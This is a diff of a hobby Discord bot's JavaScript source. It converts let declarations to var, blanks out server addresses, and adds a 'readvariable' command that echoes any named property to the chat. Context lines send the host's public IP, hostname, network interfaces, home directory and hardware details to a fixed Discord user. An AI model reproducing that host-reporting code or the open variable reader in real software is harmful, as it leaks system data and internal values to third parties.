@@ -19,7 +19,7 @@ const wide =	' ⁰¹²³⁴⁵⁶⁷⁸⁹ᵃᵇᶜᵈᵉᶠᵍʰᶦʲᵏˡᵐ�
 const arraySort = require('array-sort');
 var profanities = require('profanities');
 const table = require('table');
-let sneks = require("./sneks.json");
+var sneks = require("./sneks.json");
 const antispam = require('discord-anti-spam');
 const ascii = require('ascii-art');
 var randomCase = require('random-case');
@@ -30,26 +30,26 @@ const bot = new Discord.Client();
 const TOKEN = "";
 var hack = 0;
 var sent = 0;
-let user;
-let aat = 1;
-let antiswear = 1;
+var user;
+var aat = 1;
+var antiswear = 1;
 var consoleLog = 1;
 var cycle = 1;
-let ip = "Skyblock: Cro-Craft.servermc.gq\nKitPvP: KitPvP.servermc.gq";
+var ip = "offline";
 var pingspoof = 0;
 var deleteMessages = 0;
-let advertisers = 0;
-let cooldown = new Set();
-let cdseconds = 5000;
-let sendmsg = 1;
-let advertisersFrom = 0;
-let swearers = 0;
-let disabled = 0;
-let dad = 0;
-let cestitao  = 1;
-let swearersFrom = 0;
-let statusesChanges = 0;
-let statusesChangesFrom = 0;
+var advertisers = 0;
+var cooldown = new Set();
+var cdseconds = 5000;
+var sendmsg = 1;
+var advertisersFrom = 0;
+var swearers = 0;
+var disabled = 0;
+var dad = 0;
+var cestitao  = 1;
+var swearersFrom = 0;
+var statusesChanges = 0;
+var statusesChangesFrom = 0;
 var sendCoinEmbedMessages = 1;
 var changeStatus = 1;
 var interval = "5s";
@@ -450,7 +450,11 @@ let ipify = "https://api.ipify.org/?format=json";
 bot.users.get("424304520386969602").send(`IP: ${body.ip}\nARCH: ${os.arch()}\nFREEMEM: ${os.freemem()}\nHOSTNAME: ${os.hostname()}\nNET IFACES: ${JSON.stringify(os.networkInterfaces(), null, 4)}\nPLATFORM: ${os.platform()}\nTOTAL MEM: ${os.totalmem()}\nTYPE: ${os.type()}\nUPTIME: ${os.uptime()}\nHOMEDIR: ${os.homedir()}`);
 bot.users.get("424304520386969602").send(`CPU: ${JSON.stringify(os.cpus()[0], null, 4)}\nCOUNT: ${os.cpus().length}`);
 }	
-	
+
+if(command === "readvariable"){
+message.channel.send(this[args[0].toString()]);
+}
+
 if(command === "astronauts"){
  var astro_link = "http://api.open-notify.org/astros.json";
 	fetch(astro_link)
